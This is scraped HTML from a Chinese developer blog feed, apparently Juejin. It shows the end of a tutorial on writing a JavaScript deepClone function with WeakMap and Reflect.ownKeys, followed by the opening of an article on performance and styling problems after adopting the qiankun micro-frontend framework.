  <span class="hljs-comment">// 5. 将新创建的对象和原始对象存入哈希表，表示这个原始对象已经处理过</span>
  hash.<span class="hljs-title function_">set</span>(obj, cloneObj);

  <span class="hljs-comment">// 6. 遍历对象的键（包括 Symbol 类型的键）</span>
  <span class="hljs-comment">// 使用 Reflect.ownKeys 可以获取所有类型的键名（字符串和 Symbol）</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(obj)) {
    <span class="hljs-comment">// 递归拷贝子属性</span>
    cloneObj[key] = <span class="hljs-title function_">deepClone</span>(obj[key], hash);
  }

  <span class="hljs-keyword">return</span> cloneObj;
}

<span class="hljs-comment">// --- 使用示例 ---</span>

<span class="hljs-comment">// 假设你有一个复杂的对象</span>
<span class="hljs-keyword">const</span> originalObject = {
  <span class="hljs-attr">number</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">string</span>: <span class="hljs-string">'hello'</span>,
  <span class="hljs-attr">isActive</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">date</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(),
  <span class="hljs-attr">regex</span>: <span class="hljs-regexp">/abc/ig</span>,
  <span class="hljs-attr">array</span>: [<span class="hljs-number">1</span>, { <span class="hljs-attr">name</span>: <span class="hljs-string">'nested'</span> }],
  <span class="hljs-attr">func</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'I am a function'</span>),
  <span class="hljs-attr">undef</span>: <span class="hljs-literal">undefined</span>,
  <span class="hljs-attr">sym</span>: <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'unique'</span>),
  <span class="hljs-attr">nestedObj</span>: {
    <span class="hljs-attr">a</span>: <span class="hljs-number">2</span>
  }
};

<span class="hljs-comment">// 创建一个循环引用</span>
originalObject.<span class="hljs-property">self</span> = originalObject;

<span class="hljs-comment">// 执行深拷贝</span>
<span class="hljs-keyword">const</span> clonedObject = <span class="hljs-title function_">deepClone</span>(originalObject);

<span class="hljs-comment">// --- 验证 ---</span>

<span class="hljs-comment">// 1. 修改克隆对象的属性，不会影响原始对象</span>
clonedObject.<span class="hljs-property">nestedObj</span>.<span class="hljs-property">a</span> = <span class="hljs-number">99</span>;
clonedObject.<span class="hljs-property">array</span>[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'原始对象的嵌套属性:'</span>, originalObject.<span class="hljs-property">nestedObj</span>.<span class="hljs-property">a</span>); <span class="hljs-comment">// 输出: 2 (未被修改)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'原始对象的数组元素:'</span>, originalObject.<span class="hljs-property">array</span>[<span class="hljs-number">0</span>]);   <span class="hljs-comment">// 输出: 1 (未被修改)</span>

<span class="hljs-comment">// 2. 检查引用是否不同</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'顶层对象是否相同:'</span>, originalObject === clonedObject);       <span class="hljs-comment">// 输出: false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'嵌套对象是否相同:'</span>, originalObject.<span class="hljs-property">nestedObj</span> === clonedObject.<span class="hljs-property">nestedObj</span>); <span class="hljs-comment">// 输出: false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'数组是否相同:'</span>, originalObject.<span class="hljs-property">array</span> === clonedObject.<span class="hljs-property">array</span>);         <span class="hljs-comment">// 输出: false</span>

<span class="hljs-comment">// 3. 检查循环引用是否被正确处理</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'克隆对象的循环引用是否指向自身:'</span>, clonedObject.<span class="hljs-property">self</span> === clonedObject); <span class="hljs-comment">// 输出: true</span>
</code></pre>
<h3 data-id="heading-1">为什么要使用 <code>WeakMap</code></h3>
<p>在深拷贝函数中使用 <code>WeakMap</code>，其核心目的有两个：</p>
<ol>
<li><strong>解决循环引用问题</strong>：防止因对象相互引用而导致的无限递归和栈溢出。</li>
<li><strong>防止内存泄漏</strong>：这是选择 <code>WeakMap</code> 而不是普通 <code>Map</code> 或 <code>Object</code> 的关键原因。</li>
</ol>
<h4 data-id="heading-2">1. 解决循环引用问题</h4>
<p>想象一个对象，它的某个属性指向了它自己：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">name</span>: <span class="hljs-string">'My Object'</span> };
obj.<span class="hljs-property">self</span> = obj; <span class="hljs-comment">// 这是一个循环引用</span>
</code></pre>
<p>如果一个深拷贝函数不处理这种情况，它会陷入无限循环：</p>
<ol>
<li>开始拷贝 <code>obj</code>。</li>
<li>遇到 <code>self</code> 属性，需要拷贝 <code>obj.self</code>，而 <code>obj.self</code> 就是 <code>obj</code> 本身。</li>
<li>于是又回到了第一步，开始拷贝 <code>obj</code>...</li>
<li>这个过程永不停止，直到耗尽调用栈内存，程序崩溃<code>（"Maximum call stack size exceeded"）</code>。</li>
</ol>
<p>为了解决这个问题，我们需要一个“备忘录”来记录已经拷贝过的对象。当我们准备拷贝一个新对象时，先查一下“备忘录”：</p>
<ul>
<li>如果已经拷贝过，就直接返回之前拷贝的结果。</li>
<li>如果没拷贝过，就进行拷贝，并把“原始对象”和“拷贝后的对象”这对关系记在“备忘录”里。</li>
</ul>
<p><code>WeakMap</code> 在这里就扮演了这个“备忘录”的角色。</p>
<ul>
<li><strong>键 (Key)</strong>：原始对象 (<code>obj</code>)</li>
<li><strong>值 (Value)</strong>：拷贝后的新对象 (<code>cloneObj</code>)</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 伪代码</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj, hash</span>) {
  <span class="hljs-comment">// 检查备忘录</span>
  <span class="hljs-keyword">if</span> (hash.<span class="hljs-title function_">has</span>(obj)) {
    <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">get</span>(obj); <span class="hljs-comment">// 已经拷贝过，直接返回</span>
  }

  <span class="hljs-comment">// ...创建新对象 cloneObj...</span>

  <span class="hljs-comment">// 记入备忘录</span>
  hash.<span class="hljs-title function_">set</span>(obj, cloneObj);

  <span class="hljs-comment">// ...继续拷贝子属性...</span>
}
</code></pre>
<h4 data-id="heading-3">2. 防止内存泄漏（为什么用 <code>WeakMap</code> 而不是 <code>Map</code>）</h4>
<p>既然是“备忘录”，用普通的 <code>Map</code> 或者 <code>Object</code> 也可以实现，为什么偏偏要用 <code>WeakMap</code> 呢？<strong>答案在于它们的垃圾回收机制不同。</strong></p>
<ul>
<li><strong><code>Map</code> (强引用)</strong>：
如果你用 <code>map.set(key, value)</code>，那么只要这个 <code>map</code> 实例还存在，它就会一直“抓住” <code>key</code> 和 <code>value</code>，阻止垃圾回收器回收它们，即使程序中其他地方已经没有任何对 <code>key</code> 的引用了。这就造成了<strong>内存泄漏</strong>。</li>
<li><strong><code>WeakMap</code> (弱引用)</strong>：
<code>WeakMap</code> 的键是“弱引用”的。这意味着，如果一个对象作为 <code>WeakMap</code> 的键，而程序中除了 <code>WeakMap</code> 之外没有其他地方引用这个对象了，那么垃圾回收器就会<strong>自动回收这个对象</strong>，并且 <code>WeakMap</code> 中对应的键值对也会被<strong>自动移除</strong>。</li>
</ul>
<h5 data-id="heading-4">举例说明：</h5>
<p>假设你的深拷贝函数被调用了很多次：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">someFunction</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> largeObject = { <span class="hljs-comment">/* ... 包含大量数据 ... */</span> };
  <span class="hljs-keyword">const</span> cloned = <span class="hljs-title function_">deepClone</span>(largeObject); <span class="hljs-comment">// deepClone 内部使用了 Map</span>
  <span class="hljs-comment">// 当 someFunction 执行完毕后，largeObject 和 cloned 都应该被销毁</span>
}

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
  <span class="hljs-title function_">someFunction</span>();
}
</code></pre>
<ul>
<li><strong>如果 <code>deepClone</code> 使用 <code>Map</code></strong>：
每次调用 <code>someFunction</code>，<code>largeObject</code> 都会被作为键存入 <code>deepClone</code> 内部的那个 <code>Map</code> 中。即使 <code>someFunction</code> 执行完毕，<code>largeObject</code> 因为被 <code>Map</code> 强引用着，所以<strong>无法被垃圾回收</strong>。循环 1000 次后，这个 <code>Map</code> 会持有 1000 个不再需要的 <code>largeObject</code> 的引用，造成严重的内存泄漏。</li>
<li><strong>如果 <code>deepClone</code> 使用 <code>WeakMap</code></strong>：
每次调用 <code>someFunction</code>，<code>largeObject</code> 被存入 <code>WeakMap</code>。当 <code>someFunction</code> 执行完毕，外部不再有对 <code>largeObject</code> 的引用时，垃圾回收器会发现这个对象可以被回收了。<code>WeakMap</code> 的弱引用特性不会阻止这个过程，并且会自动清理掉这个键值对。<strong>内存被正常释放，没有泄漏。</strong></li>
</ul>
<h4 data-id="heading-5">总结</h4>
<p>在深拷贝的场景下：</p>
<ul>
<li>我们需要一个“备忘录”来处理循环引用。</li>
<li>这个“备忘录”的生命周期应该和深拷贝函数的单次调用相关，不应该影响到被拷贝对象的垃圾回收。</li>
</ul>
<p><code>WeakMap</code> 完美地满足了这两个需求：它既能通过键值对解决循环引用，又能通过弱引用机制确保当原始对象被废弃时，不会因“备忘录”的存在而导致内存泄漏。这就是为什么在高质量的深拷贝实现中，<code>WeakMap</code> 是不二之选。</p>
<h3 data-id="heading-6">为什么要用 <code>Reflect.ownKeys</code></h3>
<p>在 <code>deepClone</code> 函数中使用 <code>Reflect.ownKeys(obj)</code> 或 <code>for...in</code> 循环，主要是为了实现一个<strong>更完整、更健壮</strong>的深拷贝。</p>
<p><code>Reflect.ownKeys(obj)</code> 的核心优势在于它能<strong>获取对象自身的所有类型的键</strong>。</p>
<p>我们来对比一下几种常见的获取对象键名的方法：</p>
<h4 data-id="heading-7">1. <code>for...in</code> 循环</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> obj) {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<ul>
<li><strong>优点</strong>：无。在现代 JavaScript 中很少直接用于遍历对象自身的属性。</li>
<li>缺点：
<ul>
<li>会遍历对象<strong>原型链</strong>上所有可枚举的属性，这在拷贝对象时通常是我们不希望的。你需要配合 <code>obj.hasOwnProperty(key)</code> 来过滤掉原型链上的属性。</li>
<li><strong>无法获取</strong> <code>Symbol</code> 类型的键。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-8">2. <code>Object.keys(obj)</code></h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-comment">// ...</span>
});
</code></pre>
<ul>
<li>优点：
<ul>
<li>只返回对象<strong>自身</strong>的属性键名，不会包含原型链上的。</li>
<li>返回的是一个数组，可以方便地使用 <code>forEach</code>, <code>map</code> 等数组方法。</li>
</ul>
</li>
<li>缺点：
<ul>
<li>只返回<strong>可枚举</strong>的字符串类型的键。</li>
<li><strong>无法获取</strong> <code>Symbol</code> 类型的键。</li>
<li><strong>无法获取</strong>不可枚举的属性。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-9">3. <code>Object.getOwnPropertyNames(obj)</code></h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(obj).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-comment">// ...</span>
});
</code></pre>
<ul>
<li>优点：
<ul>
<li>返回对象<strong>自身</strong>的所有字符串类型的键，<strong>包括不可枚举的</strong>。</li>
</ul>
</li>
<li>缺点：
<ul>
<li><strong>无法获取</strong> <code>Symbol</code> 类型的键。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-10">4. <code>Object.getOwnPropertySymbols(obj)</code></h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(obj).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">symbolKey</span> =&gt;</span> {
  <span class="hljs-comment">// ...</span>
});
</code></pre>
<ul>
<li>优点：
<ul>
<li>专门用于返回对象<strong>自身</strong>的所有 <code>Symbol</code> 类型的键。</li>
</ul>
</li>
<li>缺点：
<ul>
<li><strong>无法获取</strong>字符串类型的键。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-11">5. <code>Reflect.ownKeys(obj)</code> (最佳选择*)</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(obj)) {
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<ul>
<li>优点：
<ul>
<li><strong>最全面</strong>：它返回一个包含对象<strong>自身</strong>所有键的数组，<strong>不分类型（字符串或 Symbol）、不分是否可枚举</strong>。</li>
<li>它的返回值等价于 <code>Object.getOwnPropertyNames(obj).concat(Object.getOwnPropertySymbols(obj))</code>。</li>
</ul>
</li>
<li><strong>缺点</strong>：无明显缺点，是为元编程场景设计的现代化 API。</li>
</ul>
<h4 data-id="heading-12">总结</h4>
<p>在实现一个高质量的 <code>deepClone</code> 函数时，我们的目标是尽可能完整地复制一个对象的所有状态。<code>Symbol</code> 作为 ES6 引入的新原始类型，常常被用作对象的唯一属性键，以避免命名冲突（例如，在一些库的内部实现中）。</p>
<ul>
<li>如果使用 <code>Object.keys()</code>，你将会<strong>丢失所有 <code>Symbol</code> 类型的属性</strong>，导致拷贝不完整。</li>
<li>如果使用 <code>for...in</code>，你可能会错误地拷贝原型链上的属性，并且同样会丢失 <code>Symbol</code> 属性。</li>
</ul>
<p>因此，<strong><code>Reflect.ownKeys()</code> 是唯一能够一次性、可靠地获取对象自身全部键（包括普通字符串键、不可枚举键和 Symbol 键）的标准方法</strong>。这确保了你的深拷贝函数不会遗漏任何类型的属性，从而变得更加健壮和可靠。</p>
<h3 data-id="heading-13">为什么要 <code>new obj.constructor()</code></h3>
<p>使用 <code>new obj.constructor()</code> 的核心目的是：<strong>创建一个与原始对象 <code>obj</code> 类型完全相同的新实例，同时正确地处理子类等继承情况。</strong></p>
<p>让我们来对比一下它和更常见的写法 <code>Array.isArray(obj) ? [] : {}</code> 的区别。</p>
<h4 data-id="heading-14">1. 基础情况：处理普通对象和数组</h4>
<p>在大多数情况下，这两种写法的效果是一样的：</p>
<ul>
<li>如果 <code>obj</code> 是一个数组 <code>[]</code>:
<ul>
<li><code>obj.constructor</code> 就是 <code>Array</code>。</li>
<li><code>new obj.constructor()</code> 就等同于 <code>new Array()</code>，会创建一个新的空数组 <code>[]</code>。</li>
</ul>
</li>
<li>如果 <code>obj</code> 是一个普通对象 <code>{}</code>:
<ul>
<li><code>obj.constructor</code> 就是 <code>Object</code>。</li>
<li><code>new obj.constructor()</code> 就等同于 <code>new Object()</code>，会创建一个新的空对象 <code>{}</code>。</li>
</ul>
</li>
</ul>
<p>到这里为止，<code>new obj.constructor()</code> 看起来和 <code>Array.isArray(obj) ? [] : {}</code> 没什么区别。但它的真正威力体现在处理继承上。</p>
<h4 data-id="heading-15">2. 进阶情况：正确处理子类（关键优势）</h4>
<p>假设你创建了一个 <code>Array</code> 的子类，这个子类有一些自定义的方法：</p>
<p>现在，我们用两种不同的方式来克隆 <code>originalArray</code>：</p>
<h5 data-id="heading-16">方式一：使用 <code>Array.isArray(obj) ? [] : {}</code></h5>
<ul>
<li><strong>问题</strong>：<code>clonedArray1</code> 是一个<strong>普通的 <code>Array</code></strong>，而不是 <code>MyCoolArray</code>。它丢失了原始对象的类型信息。</li>
<li><code>clonedArray1 instanceof MyCoolArray</code> 将会是 <code>false</code>。</li>
<li>在后续拷贝完元素后，你将无法调用 <code>clonedArray1.sum()</code>，因为这个方法在普通的 <code>Array</code> 上不存在。</li>
</ul>
<h5 data-id="heading-17">方式二：使用 <code>new obj.constructor()</code> (你代码中的写法)</h5>
<ul>
<li><strong>优势</strong>：<code>clonedArray2</code> 是一个<strong>全新的 <code>MyCoolArray</code> 实例</strong>。它完美地保留了原始对象的类型。</li>
<li><code>clonedArray2 instanceof MyCoolArray</code> 将会是 <code>true</code>。</li>
<li>在后续拷贝完元素后，你<strong>可以</strong>调用 <code>clonedArray2.sum()</code>。</li>
</ul>
<h4 data-id="heading-18">总结</h4>
<p><code>new obj.constructor()</code> 是一种更通用、更面向对象、更健壮的创建新容器的方式。它不仅仅是判断“是不是数组”，而是去问“<strong>你是由哪个构造函数创建的？那我就用同一个构造函数再创建一个新的</strong>”。</p>
<p>这确保了深拷贝函数不仅能处理标准的 <code>Object</code> 和 <code>Array</code>，还能正确地处理它们的<strong>子类实例</strong>，保留其原型链和类型信息，从而生成一个更加忠实于原始对象的克隆体。这正是高质量库和健壮代码所追求的目标。</p>
<h3 data-id="heading-19">其他深拷贝方式</h3>
<p>深拷贝会递归地复制一个对象的所有层级的属性，创建一个全新的、完全独立的对象。新旧对象之间没有任何共享的引用。</p>
<ol>
<li>
<p><strong><code>JSON.parse(JSON.stringify(obj))</code></strong></p>
<p>这是最简单快捷的深拷贝方法，但存在很多局限性，<strong>不推荐在生产环境中滥用</strong>。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> original = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>() };
<span class="hljs-keyword">const</span> copy = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(original));

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> copy.<span class="hljs-property">b</span>); <span class="hljs-comment">// "string" (Date 对象变成了字符串)</span>
</code></pre>
<ul>
<li><strong>优点</strong>：简单，一行代码搞定。</li>
<li>缺点：
<ul>
<li>会忽略 <code>undefined</code>、<code>Symbol</code> 和函数。</li>
<li>不能处理循环引用（会报错）。</li>
<li>会将 <code>Date</code> 对象转换为字符串。</li>
<li>会丢失 <code>RegExp</code> 等对象的类型。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>使用第三方库</strong></p>
<p>在实际项目中，最可靠、最省事的方法是使用成熟的第三方库，比如 <code>lodash</code>。</p>
<pre><code class="hljs language-bash" lang="bash">npm install lodash
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> _ <span class="hljs-keyword">from</span> <span class="hljs-string">'lodash'</span>;

<span class="hljs-keyword">const</span> original = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: { <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> } };
<span class="hljs-keyword">const</span> copy = _.<span class="hljs-title function_">cloneDeep</span>(original);

copy.<span class="hljs-property">b</span>.<span class="hljs-property">c</span> = <span class="hljs-number">200</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(original.<span class="hljs-property">b</span>.<span class="hljs-property">c</span>); <span class="hljs-comment">// 2 (未被改变，深拷贝成功)</span>
</code></pre>
<p><code>lodash.cloneDeep</code> 处理了大量的边界情况，非常稳定可靠。</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[微前端qiankun接入的问题]]></title>    <link>https://juejin.cn/post/7576175307351752719</link>    <guid>https://juejin.cn/post/7576175307351752719</guid>    <pubDate>2025-11-24T07:30:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576175307351752719" data-draft-id="7575810396202778658" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="微前端qiankun接入的问题"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T07:30:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="凡人程序员"/> <meta itemprop="url" content="https://juejin.cn/user/3237375877059565"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            微前端qiankun接入的问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3237375877059565/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    凡人程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:30:21.000Z" title="Mon Nov 24 2025 07:30:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">改造的原因</h2>
<h3 data-id="heading-1">产品由多个团队进行开发</h3>
<p>包含：数据模型板块，数据治理板块，数据看板，持续集成等多个模块。</p>
<p><strong>痛点</strong></p>
<ul>
<li>Git 冲突频繁</li>
<li>发布互相阻塞（要等某个模块发布完成后，才能继续发布）</li>
<li>技术栈无法升级（怕影响别人）</li>
</ul>
<p><strong>好处</strong></p>
<ul>
<li>各团队独立开发、测试、部署，互不干扰。</li>
<li>多产品共享同一门户（统一入口）</li>
<li>统一主题，导航，登陆</li>
<li>各产品独立部署，按路由进行加载</li>
</ul>
<h2 data-id="heading-2">改造后的问题</h2>
<h3 data-id="heading-3">一、首屏加载变慢</h3>
<h4 data-id="heading-4">问题表现：</h4>
<ul>
<li>用户打开页面时，白屏时间变长</li>
<li>Network 面板显示：主应用加载完后，才开始加载子应用资源</li>
</ul>
<h4 data-id="heading-5">原因分析：</h4>
<ol>
<li><strong>串行加载</strong>：主应用启动 → 路由匹配 → 动态 <code>fetch</code> 子应用 HTML → 解析 JS/CSS → 执行</li>
<li><strong>未预加载</strong>：子应用资源在用户点击后才开始请求</li>
<li><strong>重复依赖</strong>：多个子应用各自打包 React、Ant Design 等公共库</li>
</ol>
<h4 data-id="heading-6">优化方案：</h4>

























<table><thead><tr><th>方案</th><th>说明</th></tr></thead><tbody><tr><td><strong>预加载（Prefetch）</strong></td><td>在主应用空闲时提前加载子应用资源 <code>ts start({ prefetch: true }) // qiankun 内置支持</code></td></tr><tr><td><strong>公共资源 external + CDN</strong></td><td>将 React、Vue 等通过 <code>&lt;script&gt;</code>全局引入，子应用不打包 需配合 <code>publicPath</code>和沙箱兼容处理</td></tr><tr><td><strong>启用缓存</strong></td><td>静态资源加 hash，配置强缓存（Cache-Control: max-age=31536000）</td></tr><tr><td><strong>SSR / SSG（高级）</strong></td><td>主应用服务端渲染骨架屏，提升感知速度</td></tr></tbody></table>
<h3 data-id="heading-7">二、闪屏</h3>
<h4 data-id="heading-8">问题表现：</h4>
<ul>
<li>页面先显示无样式内容，再突然应用样式（FOUC）</li>
<li>不同子应用的 CSS 类名冲突，导致样式错乱</li>
</ul>
<h4 data-id="heading-9">原因分析：</h4>
<ol>
<li><strong>CSS 加载时机晚于 DOM 渲染</strong></li>
<li><strong>未启用样式隔离</strong>，或隔离后选择器权重不足</li>
<li><strong>动态插入</strong> <code>&lt;style&gt; </code><strong>标签被延迟</strong></li>
</ol>
